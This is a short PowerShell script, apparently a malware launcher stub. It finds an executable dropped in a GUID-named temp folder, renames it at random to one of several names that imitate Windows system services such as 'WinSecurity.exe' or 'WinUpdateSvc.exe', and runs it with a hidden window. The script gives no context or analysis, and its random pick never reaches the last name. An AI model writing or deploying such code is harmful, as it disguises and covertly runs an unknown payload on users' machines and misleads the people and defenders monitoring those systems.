$folderPath = "$env:Temp\258A2F13-D6F4-4CC9-A250-BD4CF37E9166"

$exeFile = Get-ChildItem -Path $folderPath -Filter *.exe -File

if (-not $exeFile) {
	exit
}

# Check if the process is already running
if (-not (Get-Process $exeFile.BaseName -ErrorAction SilentlyContinue)) {
	$names = @(
		"WinSysMonitor.exe",
		"SystemUpdSrv.exe",
		"WinHostSvc.exe",
		"WinSecurity.exe",
		"TaskSvc_2.exe",
		"FileMgmt.exe",
		"WinUpdateSvc.exe",
		"CoreProcess.exe",
		"SysManager.exe",
		"AppService_Util.exe"
	)
	
	$index = Get-Random -Minimum 0 -Maximum 9
	$name = $names[$index]

	Rename-Item -Path "$folderPath\$exeFile" -NewName $name
    Start-Process -FilePath "$folderPath\$name" -WindowStyle Hidden
}